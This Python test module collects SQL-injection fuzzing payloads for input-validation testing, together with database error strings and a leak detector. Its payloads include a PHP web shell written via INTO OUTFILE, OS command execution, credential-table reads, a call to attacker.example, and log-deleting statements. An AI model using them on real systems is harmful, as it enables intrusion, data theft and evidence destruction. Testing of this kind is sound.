"""SQL-injection fuzzing payloads for R5 input validation testing.

Categories:

* ``BASIC``           — boolean-based, comment-truncated classics
* ``UNION``           — UNION SELECT extractions
* ``ERROR_BASED``     — payloads that intentionally trigger DB errors
* ``BLIND_BOOLEAN``   — true/false branches with no echo
* ``BLIND_TIME``      — sleep/benchmark/waitfor delay payloads
* ``DIALECT_*``       — MySQL / PostgreSQL / MSSQL / Oracle / SQLite specific
* ``STACKED``         — stacked-query DDL/DML
* ``WAF_BYPASS``      — encodings, comment-splitting, case games
* ``AUTH_BYPASS``     — login form classics
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Generic / dialect-agnostic
# ---------------------------------------------------------------------------

BASIC: list[str] = [
    "'",
    "\"",
    "`",
    "\\'",
    "''",
    "' --",
    "' #",
    "') --",
    "')) --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "\" OR \"\"=\"",
    "\" OR 1=1 --",
    "1 OR 1=1",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin') --",
    "' OR 'x'='x",
    "1) OR (1=1",
]

UNION: list[str] = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
    "' UNION SELECT username,password FROM users --",
    "' UNION SELECT user(),version() --",
    "' UNION SELECT table_name,NULL FROM information_schema.tables --",
    "' UNION SELECT column_name,table_name FROM information_schema.columns --",
    "' UNION ALL SELECT NULL,concat(username,0x3a,password) FROM users --",
    # Order-by column count discovery
    "' ORDER BY 1 --",
    "' ORDER BY 10 --",
    "' ORDER BY 100 --",
]

ERROR_BASED: list[str] = [
    # MySQL extractvalue / updatexml — error message contains query result.
    "' AND extractvalue(1,concat(0x7e,(SELECT user()))) --",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1) --",
    "' OR (SELECT 1 FROM (SELECT count(*),concat((SELECT version()),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)y) --",
    # Postgres
    "' AND CAST((SELECT version()) AS int) --",
    # MSSQL — convert error leaks value
    "' AND 1=convert(int,(SELECT @@version)) --",
    "' AND 1=convert(int,(SELECT db_name())) --",
    # Generic divide-by-zero
    "' AND 1/0 --",
]

BLIND_BOOLEAN: list[str] = [
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "1' AND 'a'='a' --",
    "1' AND 'a'='b' --",
    "1' AND substring(version(),1,1)='5' --",
    "1' AND ascii(substring((SELECT user()),1,1))=114 --",
    "1' AND (SELECT 1 FROM users WHERE username='admin')=1 --",
    "1') AND (1)=(1) --",
]

BLIND_TIME: list[str] = [
    # MySQL / MariaDB
    "1' AND SLEEP(5) --",
    "1' AND IF(1=1,SLEEP(5),0) --",
    "1' AND BENCHMARK(5000000,MD5('a')) --",
    "1' OR SLEEP(5) #",
    "'; SELECT SLEEP(5) --",
    # PostgreSQL
    "1'; SELECT pg_sleep(5) --",
    "1' AND (SELECT 1 FROM pg_sleep(5)) --",
    # MSSQL
    "1'; WAITFOR DELAY '0:0:5' --",
    "1' WAITFOR DELAY '0:0:5' --",
    # Oracle
    "1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=1 --",
    # SQLite — no native sleep, abuse heavy operation
    "1' AND randomblob(100000000) --",
]

# ---------------------------------------------------------------------------
# Dialect-specific data-extraction primitives
# ---------------------------------------------------------------------------

DIALECT_MYSQL: list[str] = [
    "' UNION SELECT @@version,@@hostname,@@datadir --",
    "' UNION SELECT user,host,authentication_string FROM mysql.user --",
    "' UNION SELECT load_file('/etc/passwd'),NULL --",
    "' INTO OUTFILE '/tmp/out.txt' --",
    "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php' --",
]

DIALECT_POSTGRES: list[str] = [
    "'; SELECT current_database() --",
    "'; SELECT current_user --",
    "'; SELECT version() --",
    "'; COPY (SELECT '') TO PROGRAM 'id' --",
    "'; SELECT pg_read_file('/etc/passwd') --",
    "'; CREATE EXTENSION IF NOT EXISTS dblink --",
]

DIALECT_MSSQL: list[str] = [
    "'; EXEC xp_cmdshell 'whoami' --",
    "'; EXEC sp_configure 'show advanced options',1 --",
    "'; EXEC master..xp_dirtree '\\\\attacker.example\\share' --",
    "'; SELECT @@version --",
    "'; SELECT name FROM sys.databases --",
    "'; SELECT IS_SRVROLEMEMBER('sysadmin') --",
]

DIALECT_ORACLE: list[str] = [
    "' UNION SELECT banner,NULL FROM v$version --",
    "' UNION SELECT username,password FROM all_users --",
    "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1 --",
    "' AND DBMS_XMLGEN.GETXML('SELECT user FROM dual')=1 --",
]

DIALECT_SQLITE: list[str] = [
    "' UNION SELECT sqlite_version(),NULL --",
    "' UNION SELECT name,sql FROM sqlite_master --",
    "' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master --",
    "' AND randomblob(100000000) --",
]

# ---------------------------------------------------------------------------
# Stacked queries — semicolon chaining for DBs that support it
# ---------------------------------------------------------------------------

STACKED: list[str] = [
    "'; DROP TABLE users --",
    "'; INSERT INTO users(username,password) VALUES ('attacker','x') --",
    "'; UPDATE users SET password='x' WHERE username='admin' --",
    "'; CREATE TABLE pwned(x INT) --",
    "'; DELETE FROM logs --",
    "'; TRUNCATE TABLE audit --",
    "1; SELECT * FROM information_schema.tables --",
]

# ---------------------------------------------------------------------------
# WAF / sanitiser bypasses
# ---------------------------------------------------------------------------

WAF_BYPASS: list[str] = [
    # Comment-splitting through reserved words
    "' /*!50000UNION*/ /*!50000SELECT*/ NULL --",
    "' UNI/**/ON SEL/**/ECT NULL --",
    "' UNION%23%0aSELECT NULL --",        # # + LF
    "' UNION/*!*/SELECT NULL --",

    # URL-encoded operators
    "%27%20OR%201%3D1%20--",
    "%2527%20OR%201%3D1%20--",            # double-encoded
    # Whitespace alternatives
    "'\tOR\t1=1--",
    "'\nOR\n1=1--",
    "'/**/OR/**/1=1--",
    "'+OR+1=1--",

    # Mixed case
    "' uNiOn SeLeCt 1,2,3 --",

    # Unicode look-alike quote (sometimes normalised by DB driver)
    "\u2019 OR 1=1 --",   # right single quote
    "\u02bc OR 1=1 --",
    # Backtick quoting (MySQL identifier)
    "`id`'OR'1'='1",
]

# ---------------------------------------------------------------------------
# Auth bypass classics
# ---------------------------------------------------------------------------

AUTH_BYPASS: list[str] = [
    "admin",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 'a'='a' --",
    "') OR ('a'='a",
    "admin' OR '1'='1",
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' #",
    "' UNION SELECT 'admin','password' --",
    "' OR EXISTS(SELECT * FROM users) --",
]

PAYLOADS: list[str] = (
    BASIC
    + UNION
    + ERROR_BASED
    + BLIND_BOOLEAN
    + BLIND_TIME
    + DIALECT_MYSQL
    + DIALECT_POSTGRES
    + DIALECT_MSSQL
    + DIALECT_ORACLE
    + DIALECT_SQLITE
    + STACKED
    + WAF_BYPASS
    + AUTH_BYPASS
)

# ---------------------------------------------------------------------------
# Response-side error indicators
# ---------------------------------------------------------------------------

ERROR_INDICATORS: list[str] = [
    # Generic
    "sql syntax",
    "syntax error",
    "unclosed quotation",
    "unterminated string",
    "database error",
    "query failed",
    "sqlstate",

    # MySQL / MariaDB
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysqli_",
    "mysqlnd",
    "warning: mysql",
    "mariadb",

    # PostgreSQL
    "pg_query",
    "pg_exec",
    "psql:",
    "postgresql",
    "syntax error at or near",
    "invalid input syntax for",

    # MSSQL
    "microsoft ole db provider",
    "incorrect syntax near",
    "unclosed quotation mark after",
    "system.data.sqlclient",
    "[microsoft][odbc",

    # Oracle
    "ora-00933",
    "ora-00921",
    "ora-01756",
    "ora-",
    "quoted string not properly terminated",

    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    "no such table",
    "near \"",

    # ORM / driver leaks
    "sequelize",
    "sqlalchemy",
    "django.db.utils",
    "knex",
    "prisma",
]


def looks_like_sql_error(response_text: str) -> bool:
    """Heuristic: does the response leak SQL error details?"""
    lower = response_text.lower()
    return any(ind in lower for ind in ERROR_INDICATORS)
